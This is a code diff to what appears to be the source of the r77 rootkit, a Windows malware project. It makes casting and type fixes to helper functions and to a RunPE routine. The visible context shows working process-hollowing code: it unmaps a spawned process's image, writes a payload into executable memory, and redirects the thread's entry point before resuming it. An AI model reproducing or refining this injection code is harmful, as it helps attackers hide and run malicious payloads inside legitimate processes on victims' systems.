@@ -40,7 +40,7 @@ BOOL GetRandomString(PWCHAR str, DWORD length)
 		return FALSE;
 	}
 }
-LPCSTR ConvertStringToAString(LPCWSTR str)
+LPSTR ConvertStringToAString(LPCWSTR str)
 {
 	PCHAR result = NULL;
 
@@ -57,7 +57,7 @@ LPCSTR ConvertStringToAString(LPCWSTR str)
 
 	return result;
 }
-LPCWSTR ConvertAStringToString(LPCSTR str)
+LPWSTR ConvertAStringToString(LPCSTR str)
 {
 	PWCHAR result = NULL;
 
@@ -129,8 +129,12 @@ PWCHAR Int32ToStrW(LONG value, PWCHAR buffer)
 
 BOOL Is64BitOperatingSystem()
 {
+#ifdef _WIN64
+	return TRUE;
+#else
 	BOOL wow64;
-	return BITNESS(64) || IsWow64Process(GetCurrentProcess(), &wow64) && wow64;
+	return IsWow64Process(GetCurrentProcess(), &wow64) && wow64;
+#endif
 }
 BOOL IsAtLeastWindows10()
 {
@@ -763,9 +767,9 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 				// Spawn 32-bit process from this 64-bit process.
 
 				PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
-				R77_NtUnmapViewOfSection(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase);
+				R77_NtUnmapViewOfSection(processInformation.hProcess, (LPVOID)(UINT_PTR)ntHeaders->OptionalHeader.ImageBase);
 
-				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)(UINT_PTR)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
 				{
 					DWORD oldProtect;
@@ -802,9 +806,9 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 
 								if (Wow64GetThreadContext(processInformation.hThread, context))
 								{
-									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
+									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(UINT_PTR)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
 									{
-										context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+										context->Eax = (DWORD)(UINT_PTR)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 										if (Wow64SetThreadContext(processInformation.hThread, context) &&
 											ResumeThread(processInformation.hThread) != -1)
 										{
